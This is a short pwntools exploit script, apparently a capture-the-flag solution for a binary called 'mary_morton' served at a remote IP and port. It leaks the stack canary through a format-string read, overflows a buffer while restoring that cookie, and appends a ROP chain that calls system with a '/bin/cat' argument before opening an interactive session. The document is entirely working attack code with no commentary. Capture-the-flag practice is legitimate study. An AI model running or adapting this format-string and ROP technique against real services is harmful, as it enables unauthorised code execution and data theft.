from pwn import *

s = process("./mary_morton")
s = remote("146.185.132.36", 19153)

s.clean(1)

s.sendline("2")

# Get stack cookie
s.sendline("%23$llx")

cookie = int(s.recvline(),16)

print hex(cookie)

buf = "A"*(8*0x10+8)

buf += p64(cookie)
buf += "B"*8

bincat = p64(0x400b2b)
system = p64(0x4006a0)
poprdi = p64(0x400ab3)

ropchain = poprdi + bincat + system

buf += ropchain

s.sendline("1")
s.sendline(buf)
s.interactive()
